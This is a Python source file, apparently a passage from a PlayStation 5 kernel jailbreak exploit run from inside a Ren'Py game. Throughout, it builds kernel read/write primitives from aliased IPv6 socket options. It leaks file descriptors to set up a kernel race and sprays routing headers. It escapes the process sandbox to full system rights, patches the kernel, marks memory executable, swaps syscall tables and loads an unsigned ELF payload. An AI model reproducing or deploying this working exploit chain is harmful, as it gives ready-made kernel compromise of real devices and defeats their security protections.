    master_target_buf = alloc(0x14)
    slave_buf = alloc(0x14)

    master_sock = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
    if master_sock < 0:
        raise Exception("ipv6_krw: master socket() failed errno=%d" %
                        sc.syscalls.socket.errno)
    victim_sock = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
    if victim_sock < 0:
        raise Exception("ipv6_krw: victim socket() failed errno=%d" %
                        sc.syscalls.socket.errno)
    log("[ipv6_krw] master_sock=%d victim_sock=%d" % (master_sock, victim_sock))

    rc = u64_to_i64(sc.syscalls.setsockopt(
        master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buf, 0x14))
    if rc != 0:
        raise Exception("ipv6_krw: setsockopt(master IPV6_PKTINFO) rc=%d" % rc)
    rc = u64_to_i64(sc.syscalls.setsockopt(
        victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buf, 0x14))
    if rc != 0:
        raise Exception("ipv6_krw: setsockopt(victim IPV6_PKTINFO) rc=%d" % rc)

    master_so = S.kread64(
        S.kread64(S.fd_ofiles + master_sock * KOFF["FILEDESCENT_SIZE"]))
    master_pcb = S.kread64(master_so + KOFF["SO_PCB"])
    master_pktopts = S.kread64(master_pcb + KOFF["INPCB_PKTOPTS"])
    log("[ipv6_krw] master so=0x%x pcb=0x%x pktopts=0x%x" %
        (master_so, master_pcb, master_pktopts))

    victim_so = S.kread64(
        S.kread64(S.fd_ofiles + victim_sock * KOFF["FILEDESCENT_SIZE"]))
    victim_pcb = S.kread64(victim_so + KOFF["SO_PCB"])
    victim_pktopts = S.kread64(victim_pcb + KOFF["INPCB_PKTOPTS"])
    log("[ipv6_krw] victim so=0x%x pcb=0x%x pktopts=0x%x" %
        (victim_so, victim_pcb, victim_pktopts))

    S.kwrite64(master_pktopts + 0x10, victim_pktopts + 0x10)
    log("[ipv6_krw] aliased master.ip6po_pktinfo -> victim.ip6po_pktinfo")

    S.kwrite32(master_so, 0x100)
    S.kwrite32(victim_so, 0x100)
    log("[ipv6_krw] pin so_count=0x100 on master_so=0x%x victim_so=0x%x "
        "(mc.js fix_kp)" % (master_so, victim_so))

    S.elf_pipe_rfd = elf_pipe_rfd
    S.elf_pipe_wfd = elf_pipe_wfd
    S.elf_pipe_addr = elf_pipe_addr
    S.elf_master_sock = master_sock
    S.elf_victim_sock = victim_sock
    S.elf_master_so = master_so
    S.elf_victim_so = victim_so
    S.elf_master_pktopts = master_pktopts
    S.elf_victim_pktopts = victim_pktopts

    pktinfo_size_store = alloc(8)
    pktinfo_size_store[0:8] = struct.pack("<Q", 0x14)
    ipv6_kread_buf  = alloc(0x14)
    ipv6_kwrite_buf = alloc(0x14)

    def _ipv6_set_kaddr(kaddr):
        master_target_buf[0:8]    = struct.pack("<Q", kaddr)
        master_target_buf[8:0x10] = struct.pack("<Q", 0)
        master_target_buf[0x10:0x14] = struct.pack("<I", 0)
        sc.syscalls.setsockopt(
            master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buf, 0x14)

    def ipv6_kread(kaddr, buf):
        _ipv6_set_kaddr(kaddr)
        sc.syscalls.getsockopt(
            victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_size_store)

    def ipv6_kwrite(kaddr, buf):
        _ipv6_set_kaddr(kaddr)
        sc.syscalls.setsockopt(
            victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 0x14)

    def ipv6_kread64(kaddr):
        ipv6_kread(kaddr, ipv6_kread_buf)
        return struct.unpack("<Q", bytes(ipv6_kread_buf[0:8]))[0]

    def ipv6_kread32(kaddr):
        ipv6_kread(kaddr, ipv6_kread_buf)
        return struct.unpack("<I", bytes(ipv6_kread_buf[0:4]))[0]

    pipemap_buffer = alloc(0x14)

    def ipv6_copyin(uaddr, kaddr, length):
        pipemap_buffer[0:8]    = struct.pack("<Q", 0)
        pipemap_buffer[8:0x10] = struct.pack("<Q", 0x4000000000000000)
        pipemap_buffer[0x10:0x14] = struct.pack("<I", 0)
        ipv6_kwrite(elf_pipe_addr, pipemap_buffer)

        pipemap_buffer[0:8]    = struct.pack("<Q", kaddr)
        pipemap_buffer[8:0x10] = struct.pack("<Q", 0)
        pipemap_buffer[0x10:0x14] = struct.pack("<I", 0)
        ipv6_kwrite(elf_pipe_addr + 0x10, pipemap_buffer)

        sc.syscalls.write(elf_pipe_wfd, uaddr, length)

    def ipv6_kwrite64(kaddr, value):
        ipv6_kwrite_buf[0:8] = struct.pack("<Q", value)
        ipv6_copyin(get_ref_addr(ipv6_kwrite_buf), kaddr, 8)

    def ipv6_kwrite32(kaddr, value):
        ipv6_kwrite_buf[0:4] = struct.pack("<I", value & 0xFFFFFFFF)
        ipv6_copyin(get_ref_addr(ipv6_kwrite_buf), kaddr, 4)

    def ipv6_kwrite8(kaddr, value):
        ipv6_kwrite_buf[0:1] = struct.pack("<B", value & 0xFF)
        ipv6_copyin(get_ref_addr(ipv6_kwrite_buf), kaddr, 1)

    S.ipv6_kread64  = ipv6_kread64
    S.ipv6_kread32  = ipv6_kread32
    S.ipv6_kwrite64 = ipv6_kwrite64
    S.ipv6_kwrite32 = ipv6_kwrite32
    S.ipv6_kwrite8  = ipv6_kwrite8
    S.ipv6_copyin   = ipv6_copyin

    log("[ipv6_krw] DONE - ELF ABI + IPv6 kread/kwrite primitives ready")


ELF_FILENAME = "elfldr-ps5.elf"


def setup_rlimit(S):
    RLIMIT_NOFILE = 8

    rlim_pre = alloc(16)
    rc = u64_to_i64(sc.syscalls.getrlimit(RLIMIT_NOFILE, rlim_pre))
    cur = struct.unpack("<Q", bytes(rlim_pre[0:8]))[0]
    mx  = struct.unpack("<Q", bytes(rlim_pre[8:16]))[0]
    log("[setup-rlimit] getrlimit  pre: rc=%d  soft=%d  hard=%d" %
        (rc, cur, mx))

    target = 4096
    rlim_set = alloc(16)
    rlim_set[0:8]  = struct.pack("<Q", target)
    rlim_set[8:16] = struct.pack("<Q", target)
    rc = u64_to_i64(sc.syscalls.setrlimit(RLIMIT_NOFILE, rlim_set))
    log("[setup-rlimit] setrlimit  to %d: rc=%d  errno=%d" %
        (target, rc, sc.syscalls.setrlimit.errno))

    rlim_post = alloc(16)
    rc = u64_to_i64(sc.syscalls.getrlimit(RLIMIT_NOFILE, rlim_post))
    cur = struct.unpack("<Q", bytes(rlim_post[0:8]))[0]
    mx  = struct.unpack("<Q", bytes(rlim_post[8:16]))[0]
    log("[setup-rlimit] getrlimit post: rc=%d  soft=%d  hard=%d" %
        (rc, cur, mx))
    S.nofile_cap = cur


_FREE_FD_PATH_CANDIDATES = [
    "/dev/notification0",
    "/dev/gc",
    "/app0/",
    "/system/",
    "/system_data/",
    "/dev/urandom",
    "/dev/",
    "/",
]

_FD_METHOD_OPEN_PATH = "open"
_FD_METHOD_SOCKET    = "socket"
_FD_METHOD_KQUEUE    = "kqueue"


def _probe_openable_path():
    for path in _FREE_FD_PATH_CANDIDATES:
        path_buf = alloc_string(path)
        a = u64_to_i64(sc.syscalls.open(path_buf, 0))
        if a < 0:
            continue
        b = u64_to_i64(sc.syscalls.open(path_buf, 0))
        sc.syscalls.close(a)
        if b < 0:
            continue
        sc.syscalls.close(b)
        log("[prepare_fds] probe: open('%s', O_RDONLY) -> OK (repeatable)" % path)
        return path
    return None


def _new_free_fd(method, path_buf):
    if method == _FD_METHOD_OPEN_PATH:
        return u64_to_i64(sc.syscalls.open(path_buf, 0))
    if method == _FD_METHOD_SOCKET:
        return u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_STREAM, 0))
    return u64_to_i64(sc.syscalls.kqueue())


def prepare_fds(S, target_total=None, log_every_sec=60.0):
    RLIMIT_NOFILE = 8
    rl = alloc(16)
    sc.syscalls.getrlimit(RLIMIT_NOFILE, rl)
    nofile_hard = struct.unpack("<Q", bytes(rl[8:16]))[0]
    rl[0:8]  = struct.pack("<Q", nofile_hard)
    rl[8:16] = struct.pack("<Q", nofile_hard)
    sc.syscalls.setrlimit(RLIMIT_NOFILE, rl)
    log("[prepare_fds] RLIMIT_NOFILE raised to %d" % nofile_hard)

    chosen_path = _probe_openable_path()
    if chosen_path:
        method = _FD_METHOD_OPEN_PATH
        path_buf = alloc_string(chosen_path)
        log("[prepare_fds] free-fd method: open('%s')" % chosen_path)
    else:
        sock_test = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_STREAM, 0))
        if sock_test >= 0:
            sc.syscalls.close(sock_test)
            method = _FD_METHOD_SOCKET
            path_buf = None
            log("[prepare_fds] free-fd method: socket(AF_INET6) fallback")
        else:
            method = _FD_METHOD_KQUEUE
            path_buf = None
            log("[prepare_fds] free-fd method: kqueue() last-resort fallback "
                "(socket failed, errno=%d)" %
                sc.syscalls.socket.errno)

    probe_fds = []
    PROBE_CAP = 8192
    for _ in range(PROBE_CAP):
        fd = _new_free_fd(method, path_buf)
        if fd < 0:
            break
        probe_fds.append(fd)
    fd_budget = len(probe_fds)
    for fd in probe_fds:
        sc.syscalls.close(fd)
    log("[prepare_fds] fd_budget = %d (method=%s)" % (fd_budget, method))

    R_ESTIMATE = 83
    BURST_MIN = R_ESTIMATE + 40
    free_fds_num = fd_budget - 96
    if free_fds_num > 2048:
        free_fds_num = 2048
    if free_fds_num < BURST_MIN:
        log("[prepare_fds] FATAL: fd_budget=%d -> free_fds_num=%d < BURST_MIN=%d"
            % (fd_budget, free_fds_num, BURST_MIN))
        log("[prepare_fds] Sandbox is starving us; cannot proceed without "
            "kernel UAF risk")
        raise Exception("prepare_fds: free_fds_num %d below burst minimum %d"
                        % (free_fds_num, BURST_MIN))
    log("[prepare_fds] free_fds_num=%d (R_estimate=%d, margin=%d)" %
        (free_fds_num, R_ESTIMATE, free_fds_num - R_ESTIMATE))

    log("[prepare_fds] multi-setuid pre-leak (3x setuid(1) + 5s settle each)")
    for _i in range(2):
        sc.syscalls.setuid(1)
        yieldable_sleep_ms(5000)
    sc.syscalls.setuid(1)
    log("[prepare_fds] setuid(1) #1 final issued, settling 30s (v0.4.2)")
    yieldable_sleep_ms(30000)

    try:
        import gc
        gc.collect()
        log("[prepare_fds] gc.collect() done (v0.4.2)")
    except Exception as _e:
        log("[prepare_fds] gc.collect() fail: " + str(_e))


    if target_total is None:
        target_total = 0x100000001 - free_fds_num
    log("[prepare_fds] LEAK PHASE: target_total=%d (0x%x)  "
        "[= 0x100000001 - %d burst]" %
        (target_total, target_total, free_fds_num))
    stage0_leak(S, target_total)

    log("[prepare_fds] BURST: opening %d free_fds (this completes the wrap)"
        % free_fds_num)
    S.free_fds = []
    burst_failures = 0
    for i in range(free_fds_num):
        fd = _new_free_fd(method, path_buf)
        if fd < 0:
            burst_failures += 1
            if burst_failures >= 8:
                log("[prepare_fds] WARN: 8 burst failures in a row at i=%d - "
                    "stopping burst early" % i)
                break
            continue
        burst_failures = 0
        S.free_fds.append(fd)
    S.free_fd_idx = 0
    log("[prepare_fds] BURST DONE: %d / %d free_fds opened" %
        (len(S.free_fds), free_fds_num))

    sc.syscalls.setuid(1)
    log("[prepare_fds] setuid(1) #2 issued (p_ucred migration A->B), "
        "settling 10s for td_ucred drain")
    yieldable_sleep_ms(10000)

    log("[prepare_fds] DONE - cr_ref(A) ~= 1, ready for attempt_race")


def setup_ipv6_spray(S):
    S.ipv6_sockets = []
    for _ in range(NUM_IPV6_SOCKETS):
        fd = u64_to_i64(sc.syscalls.socket(AF_INET6, SOCK_STREAM, 0))
        if fd < 0:
            break
        S.ipv6_sockets.append(fd)
    S.ipv6_count = len(S.ipv6_sockets)

    for fd in S.ipv6_sockets:
        free_rthdr(fd)
    nanosleep_ms(500)

    S.rthdr_spray     = alloc(UCRED_SIZE)
    S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE)

    S.tag_buf = alloc(16)
    S.tag_len = alloc(4)


ELF_REGION_SIZE = 0x600000


def setup_all(S):
    try:
        S.elf_region = alloc(ELF_REGION_SIZE)
        S.elf_region_addr = get_ref_addr(S.elf_region)
        log("[elf-ip] pre-allocated ELF region: addr=0x%x size=0x%x" %
            (S.elf_region_addr, ELF_REGION_SIZE))
    except Exception as _e:
        S.elf_region = None
        S.elf_region_addr = 0
        log("[elf-ip] ELF region pre-alloc FAILED: %s" % str(_e))
    setup_cpu_masks(S)
    apply_main_thread_pinning(S)
    setup_rlimit(S)
    setup_worker_sockets(S)
    setup_iov_buffers(S)
    setup_uio_buffers(S)
    setup_pipes_kernrw(S)
    setup_ipv6_spray(S)
    S.iov_ws       = WorkerSync(IOV_THREAD_NUM)
    S.uio_read_ws  = WorkerSync(UIO_THREAD_NUM)
    S.uio_write_ws = WorkerSync(UIO_THREAD_NUM)
    S.leak_ws      = WorkerSync(len(LEAK_CORES))
    setup_iov_workers(S)
    log("[p2jb] %d iov workers spawned (uio deferred to stage3)" %
        IOV_THREAD_NUM)
    sched_yield_n(10)
    setup_race_workers(S)
    log("[setup] %d race workers spawned" % len(S.race_workers))


def do_leak(S):
    log("[stage1] PRODUCTION: full 4.29B kq leak + %d race attempts (~1h)" %
        TRIPLEFREE_ATTEMPTS)
    prepare_fds(S, target_total=None, log_every_sec=60.0)
    success = stage1(S, max_attempts=TRIPLEFREE_ATTEMPTS)
    if not success:
        log("[p2jb] stage0 FAILED on CONSOLE_KIND=%s - reboot + retry" %
            CONSOLE_KIND)
        return False
    log("[p2jb] *** STAGE1 SUCCESS *** CONSOLE_KIND=%s" % CONSOLE_KIND)
    return True


def do_pre_finalize(S):
    stage2(S)
    log("[p2jb] *** STAGE2 SUCCESS *** proc_filedesc=0x%x" % S.proc_filedesc)
    setup_uio_workers(S)
    log("[p2jb] %d uio workers spawned (4 read + 4 write)" %
        (UIO_THREAD_NUM * 2))
    stage3(S)
    log("[p2jb] *** STAGE3 SUCCESS *** master=0x%x victim=0x%x" %
        (S.master_pipe_data, S.victim_pipe_data))
    stage4_full(S)
    stage5(S)
    log("[p2jb] *** STAGE5 SUCCESS *** rootvnode=0x%x" % S.rootvnode)
    stage6(S)
    log("[p2jb] *** STAGE6 SUCCESS - JAILBROKEN ***")
    log("[p2jb] proc is now SYSTEM with all caps, unjailed at /")


class KernelAdapter(object):

    def __init__(self, S):
        self._S = S
        self.curproc_addr = S.curproc
        self.allproc_addr = S.data_base + KOFF["DATA_BASE_ALLPROC"]
        self.data_base = S.data_base
        self.base_addr = S.data_base
        self.dmap_base_addr = getattr(S, "dmap_base", 0)
        self.kernel_cr3_addr = getattr(S, "kernel_cr3", 0)

    def read_buffer(self, addr, size):
        buf = alloc(size)
        self._S.kread(buf, addr, size)
        return bytearray(buf)

    def read_qword(self, addr):
        return self._S.kread64(addr)

    def read_dword(self, addr):
        return self._S.kread32(addr)

    def read_byte(self, addr):
        return self._S.kread8(addr)

    def write_qword(self, addr, val):
        self._S.kwrite64(addr, val)

    def write_dword(self, addr, val):
        self._S.kwrite32(addr, val)

    def write_byte(self, addr, val):
        self._S.kwrite8(addr, val)

    def read_null_terminated_string(self, addr, max_len=256):
        buf = self.read_buffer(addr, max_len)
        idx = buf.find(b"\x00")
        if idx == -1:
            return buf.decode("latin-1", errors="ignore")
        return buf[:idx].decode("latin-1", errors="ignore")


LOAD_ELF_INPLACE_ENABLED = True


def _find_vmmap_entry(S, target_va):
    OFF_NEXT, OFF_START, OFF_END = 0x8, 0x20, 0x28
    vmspace = S.kread64(S.curproc + KOFF["PROC_VM_SPACE"])
    header = vmspace
    entry = S.kread64(header + OFF_NEXT)
    n = 0
    while entry != 0 and entry != header and n < 30000:
        start = S.kread64(entry + OFF_START)
        end = S.kread64(entry + OFF_END)
        if start <= target_va < end:
            return (entry, start, end)
        n += 1
        entry = S.kread64(entry + OFF_NEXT)
    return None


def _find_proc_offsets(kernel):
    data = kernel.read_buffer(kernel.curproc_addr, 0x1000)
    comm_pat = [0xCE, 0xFA, 0xEF, 0xBE, 0xCC, 0xBB]
    sysent_pat = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F]

    def _scan(pat):
        lim = len(data) - len(pat) + 1
        for i in range(lim):
            ok = True
            for o in range(len(pat)):
                if data[i + o] != pat[o]:
                    ok = False
                    break
            if ok:
                return i
        return -1

    cs = _scan(comm_pat)
    ss = _scan(sysent_pat)
    if cs < 0 or ss < 0:
        return (None, None)
    return (cs + 0x8, ss - 0x10)


def _find_proc_by_name(kernel, proc_comm_off, name):
    proc = kernel.read_qword(kernel.allproc_addr)
    n = 0
    while proc != 0 and n < 4000:
        try:
            nm = kernel.read_null_terminated_string(proc + proc_comm_off)
        except Exception:
            nm = ""
        if nm == name:
            return proc
        proc = kernel.read_qword(proc)
        n += 1
    return 0


def stage10_load_elf_inplace(S):
    import os
    from structure import Structure
    from utils.unsafe import readbuf, writebuf

    if not getattr(S, "elf_region", None):
        log("[elf-ip] no ELF region (pre-alloc failed) -> abort")
        return False
    addr0 = S.elf_region_addr
    found = _find_vmmap_entry(S, addr0)
    if found is None:
        log("[elf-ip] vm_map_entry for ELF region (0x%x) not found -> abort"
            % addr0)
        return False
    entry, base, ent_end = found
    region_size = ent_end - base
    log("[elf-ip] ELF region: addr0=0x%x entry=0x%x base=0x%x size=0x%x" %
        (addr0, entry, base, region_size))

    try:
        import renpy
        path = renpy.config.savedir + "/yarpe/" + ELF_FILENAME
    except Exception:
        path = "/saves/yarpe/" + ELF_FILENAME
    if not os.path.exists(path):
        log("[elf-ip] ELF not found: %s" % path)
        return False
    with open(path, "rb") as f:
        elf_data = f.read()
    log("[elf-ip] ELF %s (%d bytes)" % (path, len(elf_data)))

    ELF_HEADER_STRUCT = Structure([
        ("magic", 4), ("skip1", 0x14),
        ("e_entry", 8), ("e_phoff", 8), ("e_shoff", 8),
        ("skip2", 8), ("e_phnum", 2), ("skip3", 2), ("e_shnum", 2),
    ])
    PROGRAM_HEADER_STRUCT = Structure([
        ("p_type", 4), ("p_flags", 4), ("p_offset", 8), ("p_vaddr", 8),
        ("skip1", 8), ("p_filesz", 8), ("p_memsz", 8),
    ])
    SECTION_HEADER_STRUCT = Structure([
        ("sh_name", 4), ("sh_type", 4), ("skip1", 0x10),
        ("sh_offset", 8), ("sh_size", 8),
    ])
    RELA_STRUCT = Structure([("r_offset", 8), ("r_info", 8), ("r_addend", 8)])
    SHT_RELA, RELA_ENTSIZE, ELF_PT_LOAD, ELF_R_REL = 4, 0x18, 1, 8

    elf_buf = alloc(len(elf_data))
    elf_buf[0:len(elf_data)] = elf_data
    elf_store = get_ref_addr(elf_buf)
    eh = ELF_HEADER_STRUCT.from_address(elf_store)
    ph_off = eh.e_phoff

    max_end = 0
    for i in range(eh.e_phnum):
        ph = PROGRAM_HEADER_STRUCT.from_address(elf_store + ph_off + i * 0x38)
        if ph.p_type == ELF_PT_LOAD:
            max_end = max(max_end, ph.p_vaddr + ph.p_memsz)
    log("[elf-ip] image span=0x%x region=0x%x" % (max_end, region_size))
    if max_end > region_size:
        log("[elf-ip] ELF too large for region -> abort")
        return False

    for i in range(eh.e_phnum):
        ph = PROGRAM_HEADER_STRUCT.from_address(elf_store + ph_off + i * 0x38)
        if ph.p_type != ELF_PT_LOAD:
            continue
        writebuf(base + ph.p_vaddr,
                 readbuf(elf_store + ph.p_offset, ph.p_filesz))
        log("[elf-ip] PH[%d] vaddr=0x%x filesz=0x%x flags=0x%x loaded" %
            (i, ph.p_vaddr, ph.p_filesz, ph.p_flags))

    sh_off = eh.e_shoff
    nrel = 0
    for i in range(eh.e_shnum):
        sh = SECTION_HEADER_STRUCT.from_address(elf_store + sh_off + i * 0x40)
        if sh.sh_type != SHT_RELA:
            continue
        for j in range(sh.sh_size // RELA_ENTSIZE):
            rel = RELA_STRUCT.from_address(
                elf_store + sh.sh_offset + j * RELA_ENTSIZE)
            if rel.r_info & 0xFF != ELF_R_REL:
                continue
            writebuf(base + rel.r_offset,
                     struct.pack("<Q", base + rel.r_addend))
            nrel += 1
    log("[elf-ip] %d RELATIVE relocs applied" % nrel)

    rwx = PROT_READ | PROT_WRITE | PROT_EXEC
    region_end = base + region_size
    e = entry
    npatched = 0
    while e:
        st = S.kread64(e + 0x20)
        if st >= region_end:
            break
        cur = S.kread8(e + 0x64)
        S.kwrite8(e + 0x64, (cur | rwx) & 0xFF)
        log("[elf-ip] entry 0x%x protection 0x%x -> 0x%x" %
            (e, cur, S.kread8(e + 0x64)))
        npatched += 1
        e = S.kread64(e + 0x08)
    log("[elf-ip] %d entries set RWX via +0x64 (SDK-style)" % npatched)

    payloadout = alloc(4)
    rwpipe = alloc(8)
    rwpipe[0:4] = struct.pack("<I", S.elf_pipe_rfd)
    rwpipe[4:8] = struct.pack("<I", S.elf_pipe_wfd)
    rwpair = alloc(8)
    rwpair[0:4] = struct.pack("<I", S.elf_master_sock)
    rwpair[4:8] = struct.pack("<I", S.elf_victim_sock)
    syscall_wrapper = sc.libkernel_addr + 0x0
    try:
        gp = alloc(8)
        if u64_to_i64(sc.syscalls.dlsym(0x2001, b"getpid", gp)) == 0:
            syscall_wrapper = struct.unpack("<Q", bytes(gp[0:8]))[0]
    except Exception:
        pass
    args = alloc(0x30)
    args[0x00:0x08] = struct.pack("<Q", syscall_wrapper)
    args[0x08:0x10] = struct.pack("<Q", get_ref_addr(rwpipe))
    args[0x10:0x18] = struct.pack("<Q", get_ref_addr(rwpair))
    args[0x18:0x20] = struct.pack("<Q", S.elf_pipe_addr)
    args[0x20:0x28] = struct.pack("<Q", S.data_base)
    args[0x28:0x30] = struct.pack("<Q", get_ref_addr(payloadout))

    elf_entry_point = base + eh.e_entry
    log("[elf-ip] entry=0x%x, spawning ELF thread..." % elf_entry_point)

    def _spawn():
        thr_handle = alloc(8)
        ret = sc.functions.Thrd_create(thr_handle, elf_entry_point, args)
        if u64_to_i64(ret) != 0:
            log("[elf-ip] Thrd_create FAILED rc=%d" % u64_to_i64(ret))
            return None
        tid = struct.unpack("<Q", bytes(thr_handle[0:8]))[0]
        log("[elf-ip] *** ELF THREAD SPAWNED tid=0x%x (in-place RWX, no new "
            "mmap) ***" % tid)
        return thr_handle

    if CONSOLE_KIND == "PS5":
        _spawn()
    else:
        kernel = SHARED_VARS["kernel"]
        proc_comm, proc_sysent = _find_proc_offsets(kernel)
        if proc_comm is None or proc_sysent is None:
            log("[elf-ip] FATAL: PROC_COMM/PROC_SYSENT not located -> cannot "
                "enable PS5 syscalls, aborting load (would KP)")
            return False
        target = _find_proc_by_name(kernel, proc_comm, "SceGameLiveStreaming")
        if target == 0:
            log("[elf-ip] FATAL: PS5-native proc (SceGameLiveStreaming) not "
                "found -> aborting load")
            return False
        cur_sysent = kernel.read_qword(kernel.curproc_addr + proc_sysent)
        tgt_sysent = kernel.read_qword(target + proc_sysent)
        cur_sz = kernel.read_dword(cur_sysent)
        cur_tbl = kernel.read_qword(cur_sysent + 0x8)
        tgt_sz = kernel.read_dword(tgt_sysent)
        tgt_tbl = kernel.read_qword(tgt_sysent + 0x8)
        log("[elf-ip] PS4 build: sysent swap cur=0x%x(sz=%d) -> "
            "ps5=0x%x(sz=%d)" % (cur_sysent, cur_sz, tgt_sysent, tgt_sz))
        try:
            sc.make_function_if_needed(
                "Thrd_join", sc.libc_addr + SELECTED_LIBC["Thrd_join"])
        except Exception:
            pass
        kernel.write_dword(cur_sysent, tgt_sz)
        kernel.write_qword(cur_sysent + 0x8, tgt_tbl)
        try:
            th = _spawn()
            if th is not None:
                try:
                    sc.functions.Thrd_join(
                        struct.unpack("<Q", bytes(th[0:8]))[0], 0)
                except Exception as _je:
                    log("[elf-ip] Thrd_join: %s" % str(_je))
        finally:
            kernel.write_dword(cur_sysent, cur_sz)
            kernel.write_qword(cur_sysent + 0x8, cur_tbl)
            log("[elf-ip] sysent restored")

    sc.send_notification(P2JB_VERSION + "\nELF running")
    return True


def do_finalize(S):
    stage7(S)
    if not S.data_base_ok:
        log("[p2jb] stage7 data_base check failed, skipping stage8+9 (jb still done)")
        return
    log("[p2jb] *** STAGE7 SUCCESS *** data_base=0x%x" % S.data_base)
    stage8(S)
    log("[p2jb] *** STAGE8 SUCCESS *** dynlib restrictions removed")
    build_ipv6_kernel_rw(S)
    log("[p2jb] *** IPV6 KRW SUCCESS *** ELF ABI + IPv6 R/W primitives ready "
        "(master_sock=%d victim_sock=%d pipe_rfd=%d pipe_wfd=%d "
        "pipe_addr=0x%x)" %
        (S.elf_master_sock, S.elf_victim_sock,
         S.elf_pipe_rfd, S.elf_pipe_wfd, S.elf_pipe_addr))
    try:
        setup_gpu_dma(S)
        stage9(S)
        log("[p2jb] *** STAGE9 SUCCESS *** kernel patches applied (debug menu)")
        log("[p2jb] *** JAILBREAK FULLY FINALIZED + DEBUG MENU ENABLED ***")
    except Exception as _e:
        log("[p2jb] stage9 / gpu_dma failed: %s (jb still done)" % str(_e))


    try:
        SHARED_VARS["kernel"] = KernelAdapter(S)
        SHARED_VARS["ipv6_kernel_rw_data"] = {
            "pipe_read_fd": S.elf_pipe_rfd,
            "pipe_write_fd": S.elf_pipe_wfd,
            "pipe_addr": S.elf_pipe_addr,
            "master_sock": S.elf_master_sock,
            "victim_sock": S.elf_victim_sock,
        }
        log("[p2jb] SHARED_VARS populated: kernel + ipv6_kernel_rw_data")
    except Exception as _e:
        log("[p2jb] SHARED_VARS populate FAIL: %s" % str(_e))

    log("[p2jb] *** JAILBREAK COMPLETE + DEBUG MENU ENABLED ***")
    sc.send_notification(P2JB_VERSION + "\nJailbroken")

    if LOAD_ELF_INPLACE_ENABLED:
        log("[p2jb] *** loading ELF loader, this can take a bit - please "
            "wait... ***")
        sc.send_notification(P2JB_VERSION +
                             "\nLoading ELF loader, please wait...")
        try:
            stage10_load_elf_inplace(S)
        except Exception as _e:
            import traceback
            log("[elf] load exception: %s" % str(_e))
            try:
                from utils.rp import log_exc
                log_exc(traceback.format_exc())
            except Exception:
                pass

    cleanup_exit(S, keep_rw=True)


def kexploit():
    log("[p2jb] " + P2JB_VERSION)
    sc.send_notification(P2JB_VERSION)

    if sc.platform != "ps5":
        log("[p2jb] FATAL: not running on PS5 (platform=%s)" % sc.platform)
        return
    if sc.version not in FW_ALIAS_P2JB:
        log("[p2jb] FATAL: FW %s not supported. Supported: %s" %
            (sc.version, ", ".join(sorted(FW_ALIAS_P2JB.keys()))))
        return
    log("[p2jb] FW %s -> offsets base '%s' (DATA_BASE_ALLPROC=0x%x)" %
        (sc.version, _FW_BASE, KOFF["DATA_BASE_ALLPROC"]))

    log("[p2jb] platform=%s libc=0x%x libkernel=0x%x exec=0x%x  CONSOLE_KIND=%s" %
        (sc.platform, sc.libc_addr, sc.libkernel_addr, sc.exec_addr, CONSOLE_KIND))

    try:
        import renpy

        try:
            renpy.game.preferences.afm_enable = False
            log("[quiet] afm_enable=False OK")
        except Exception as _e:
            log("[quiet] afm_enable fail: " + str(_e))

        for _modname in ("renpy.audio.music", "renpy.audio.audio",
                         "renpy.exports"):
            try:
                __import__(_modname)
                _mod = renpy
                for _part in _modname.split(".")[1:]:
                    _mod = getattr(_mod, _part)
                for _fn in ("music_stop", "stop", "quit_audio"):
                    if hasattr(_mod, _fn):
                        try:
                            getattr(_mod, _fn)()
                            log("[quiet] %s.%s() OK" % (_modname, _fn))
                        except Exception as _e:
                            log("[quiet] %s.%s() fail: %s" %
                                (_modname, _fn, str(_e)))
            except ImportError as _e:
                log("[quiet] __import__(%s) fail: %s" % (_modname, str(_e)))
            except Exception as _e:
                log("[quiet] %s exception: %s" % (_modname, str(_e)))

        for _ch in ("music", "sound", "voice"):
            try:
                renpy.game.preferences.set_volume(_ch, 0.0)
                log("[quiet] volume(%s)=0 OK" % _ch)
            except Exception as _e:
                log("[quiet] volume(%s) fail: %s" % (_ch, str(_e)))

        try:
            renpy.game.preferences.transitions = 0
            log("[quiet] transitions=0 OK")
        except Exception as _e:
            log("[quiet] transitions fail: " + str(_e))

        try:
            renpy.exports.skipping = True
            log("[quiet] exports.skipping=True OK")
        except Exception as _e:
            log("[quiet] exports.skipping fail: " + str(_e))
        try:
            renpy.config.skip_unimportant_events = True
            log("[quiet] config.skip_unimportant_events=True OK")
        except Exception as _e:
            log("[quiet] skip_unimportant_events fail: " + str(_e))

        try:
            renpy.config.predict_statements = 0
            log("[quiet] config.predict_statements=0 OK")
        except Exception as _e:
            log("[quiet] predict_statements fail: " + str(_e))
        try:
            renpy.config.image_cache_size = 0
            log("[quiet] config.image_cache_size=0 OK")
        except Exception as _e:
            log("[quiet] image_cache_size fail: " + str(_e))
    except Exception as _e:
        log("[quiet] renpy module access failed: " + str(_e))

    S = P2JBState()
    S.orig_main_core = get_current_core()
    try:
        S.orig_rtprio = get_rtprio()
    except Exception:
        S.orig_rtprio = 0
    log("[p2jb] CONSOLE_KIND=%s orig_main_core=%d orig_rtprio=%d" %
        (CONSOLE_KIND, S.orig_main_core, S.orig_rtprio))

    setup_all(S)
    if not do_leak(S):
        return
    do_pre_finalize(S)
    do_finalize(S)

try:
    kexploit()
except Exception as e:
    import traceback
    from utils.rp import log_exc
    log_exc(traceback.format_exc())
